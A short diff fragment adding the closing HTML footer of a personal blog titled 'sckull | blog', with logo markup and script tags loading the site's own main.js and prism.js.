+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+</div>
+
+</body>
+</html>
